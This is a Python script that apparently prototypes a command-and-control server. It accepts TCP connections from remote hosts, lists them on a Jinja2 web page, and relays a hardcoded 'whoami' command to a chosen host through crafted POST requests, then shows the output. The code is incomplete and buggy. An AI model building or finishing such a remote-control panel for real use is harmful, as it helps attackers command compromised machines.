import socket
import pdb
from optparse import OptionParser
from threading import Thread
from jinja2 import Template


def parse_cli_args():
    parser = OptionParser()
    parser.add_option('-a', '--socket_addr', dest='socket_addr')
    parser.add_option('-p', '--socket_port', dest='socket_port')
    options, args = parser.parse_args()
    return {
        'socket_host': options.socket_addr,
        'socket_port': options.socket_port
    }

opts = parse_cli_args()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = opts['socket_host'], int(opts['socket_port'])
sock.bind(server_address)
sock.listen(1)


connections = list()
while True:
    # pdb.set_trace()
    connection, client_addr = sock.accept()
    print(f'New conn from {client_addr}')
    if client_addr[1] not in ('localhost', '127.0.0.1'):
        connections.append({
            'conn': connection,
            'ip': client_addr[0],
            'port': client_addr[1]
        })
    payload = b'whoami'
    data = connection.recv(1024).decode('utf-8')
    if data.startswith('GET'):
        print(data)
    if data.startswith('GET / '):
        # payload URLs: POST /b64<payload>?b64<host:port>
        # add payload input field
        print(data)
        with open('index.html') as file_:
            template = Template(file_.read())
        # check connections if actual/exclude web conns
        response = template.render(connections=connections)
        connection.sendall(b'HTTP/1.1 200 OK\r\n\r\n')
        connection.send(response.encode('utf-8'))
        connection.close()
        continue
    elif data.startswith('GET /favicon'):
        connection.sendall(b'HTTP/1.1 404 Not Found\r\n\r\n')
        connection.close()
    elif data.startswith('POST /'):
        # encode payload b64
        # payload: POST /b64<payload>?b64<host:port>
        host, port = data.split()[1].split('?')[1].split(':')
        connection = None
        for conn in connections:
            if conn['ip'] == host and conn['port'] == port:
                connection = conn
            # payload
        print(f'sending payload to {host}: >> {payload}')
        connection.sendall(payload)
        # render payload result
        response_data = connection.recv(1024)
        print(response_data)
        response = template.render(response=response_data)
        connection.sendall(b'HTTP/1.1 200 OK\r\n\r\n')
        connection.send(response.encode('utf-8'))
    elif not data: break  # else?
    print(data)
    print(f'{client_addr}: << {data}')
